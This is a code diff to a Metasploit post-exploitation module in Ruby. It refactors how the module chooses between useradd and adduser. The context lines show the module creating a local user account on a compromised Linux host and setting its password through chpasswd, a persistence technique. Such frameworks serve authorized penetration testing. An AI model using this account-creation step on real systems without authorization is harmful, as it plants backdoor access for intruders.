@@ -130,16 +130,8 @@ class MetasploitModule < Msf::Post
         get_sysinfo[:distro]
       end
 
-    binary_case = case binary
-                  when /useradd$/
-                    'useradd'
-                  when /adduser$/
-                    'adduser'
-                  else
-                    binary
-                  end
-    case binary_case
-    when 'useradd'
+    case binary
+    when /useradd$/
       print_status("Running on #{os_platform}")
       print_status('Useradd exists. Using that')
       case os_platform
@@ -168,7 +160,7 @@ class MetasploitModule < Msf::Post
         d_cmd_exec("#{binary} #{datastore['USERNAME']} | echo")
         d_cmd_exec("echo \'#{datastore['USERNAME']}:#{passwd}\'|chpasswd -e")
       end
-    when 'adduser'
+    when /adduser$/
       print_status("Running on #{os_platform}")
       print_status('Adduser exists. Using that')
       case os_platform
